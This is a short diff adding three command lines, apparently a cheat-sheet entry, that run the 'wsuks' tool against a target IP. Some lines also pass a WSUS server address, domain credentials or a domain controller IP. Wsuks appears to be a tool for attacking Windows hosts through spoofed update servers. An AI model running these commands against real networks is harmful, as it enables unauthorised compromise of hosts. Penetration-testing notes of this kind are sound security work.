@@ -1,0 +1,3 @@
+wsuks --target-ip "$IP" --WSUS-Server "$WSUS_IP"
+wsuks --target-ip "$IP" --WSUS-Server "$WSUS_IP" --username "$USER" --password "$PASSWORD" --domain "$DOMAIN"
+wsuks --target-ip "$IP" --username "$USER" --password "$PASSWORD" --domain "$DOMAIN" --dc-ip "$DC_IP"
